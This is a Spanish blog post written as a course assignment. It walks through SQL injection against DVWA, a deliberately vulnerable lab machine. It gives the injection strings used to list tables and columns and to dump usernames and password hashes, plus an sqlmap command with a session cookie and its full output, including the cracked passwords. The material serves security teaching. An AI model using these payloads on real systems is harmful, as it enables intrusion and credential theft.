---
title: "#moocHackingMU - Semana 2 - Tarea 2"
date: '2016-09-21 12:09:00'
layout: post
tags:
- moocHackingMU
---
## TAREA 2: SQL injection

> En esta tarea vamos a usar la técnica SQL injection para obtener información relevante sobre la estructura de una base de datos. En concreto, vamos a obtener información de usuarios de un servidor (nombre de usuario, hash de la contraseña) a partir de un ataque de SQL injection.

Descarga: [dvwa.7z](https://www.dropbox.com/s/1km8n8v5gzd6mxq/dvwa.7z?dl=0)

Una vez instalado y configurado la maquina virtual procedemos a probar la vulnerabilidad SQL Injection:

Simplemente metiendo una comilla nos sale un error:

`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1`

Una buena indicación de que algo va *mal* y información sobre la base de datos en uso (MySQL).

Si metemos `%' or '0'='0` ` que equivale a `mysql> SELECT first_name, last_name FROM users WHERE user_id = '%' or '0'='0';` en SQL nos sale:

```
ID: %' or '0'='0
First name: admin
Surname: admin

ID: %' or '0'='0
First name: Gordon
Surname: Brown

ID: %' or '0'='0
First name: Hack
Surname: Me

ID: %' or '0'='0
First name: Pablo
Surname: Picasso

ID: %' or '0'='0
First name: Bob
Surname: Smith
```

Podemos meter consultas SQL de la siguiente forma:

%' and 1=0 union select null, <consulta>

Para sacar todas las tablas:

`%' and 1=0 union select null, table_name from information_schema.tables #`

Para sacar todas las columnas de la tabla `users`:

`%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #`

```
ID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
First name: 
Surname: admin
admin
admin
5f4dcc3b5aa765d61d8327deb882cf99

ID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
First name: 
Surname: Gordon
Brown
gordonb
e99a18c428cb38d5f260853678922e03

ID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
First name: 
Surname: Hack
Me
1337
8d3533d75ae2c3966d7e0d4fcc69216b

ID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
First name: 
Surname: Pablo
Picasso
pablo
0d107d09f5bbe40cade3de5c71e9e9b7

ID: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
First name: 
Surname: Bob
Smith
smithy
5f4dcc3b5aa765d61d8327deb882cf99
```

Para facilitar la injección y automatizar podemos usar la herramienta sqlmap. Primero hay que sacar los cookies para aprovecharnos de la session iniciada:

![](http://i.imgur.com/QiIoQKN.png)

...y ejecutamos sqlmap con los opciones correspondientes:

![](http://i.imgur.com/CynVBF2.png)

```bash

sqlmap --url="http://192.168.56.101/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=ls0p6ptk77pd5n679tkq5o3102;security=low" --dbms=mysql -D dvwa -T users --dump
         _
 ___ ___| |_____ ___ ___  {1.0.9.1#dev}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 17:49:30

[17:49:30] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) (NOT)
    Payload: id=1' OR NOT 8563=8563#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a707671,(SELECT (ELT(5366=5366,1))),0x71786a7071,0x78))s), 8446744073709551610, 8446744073709551610)))-- TjSs&Submit=Submit

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=1' AND SLEEP(5)-- KJEj&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=1' UNION ALL SELECT CONCAT(0x717a707671,0x485262774a6e484a664b724a63744e466d764f6a6c6b49466a6e476f52646e6c6f54466c6c78656a,0x71786a7071),NULL#&Submit=Submit
---
[17:49:30] [INFO] testing MySQL
[17:49:30] [INFO] confirming MySQL
[17:49:30] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8.0 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.0
[17:49:30] [INFO] fetching columns for table 'users' in database 'dvwa'
[17:49:30] [INFO] fetching entries for table 'users' in database 'dvwa'
[17:49:30] [INFO] analyzing table dump for possible password hashes
[17:49:30] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[17:49:32] [INFO] writing hashes to a temporary file '/tmp/sqlmapiBf7ph5323/sqlmaphashes-D5GgEq.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[17:49:39] [INFO] using hash method 'md5_generic_passwd'
[17:49:39] [INFO] resuming password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'
[17:49:39] [INFO] resuming password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'
[17:49:39] [INFO] resuming password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'
[17:49:39] [INFO] resuming password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'
[17:49:39] [INFO] postprocessing table dump
Database: dvwa
Table: users
[5 entries]
+---------+---------+---------------------------------+---------------------------------------------+-----------+------------+
| user_id | user    | avatar                          | password                                    | last_name | first_name |
+---------+---------+---------------------------------+---------------------------------------------+-----------+------------+
| 1       | admin   | dvwa/hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      |
| 2       | gordonb | dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     |
| 3       | 1337    | dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       |
| 4       | pablo   | dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      |
| 5       | smithy  | dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        |
+---------+---------+---------------------------------+---------------------------------------------+-----------+------------+

[17:49:39] [INFO] table 'dvwa.users' dumped to CSV file '/root/.sqlmap/output/192.168.56.101/dump/dvwa/users.csv'
[17:49:39] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.56.101'

[*] shutting down at 17:49:39


```
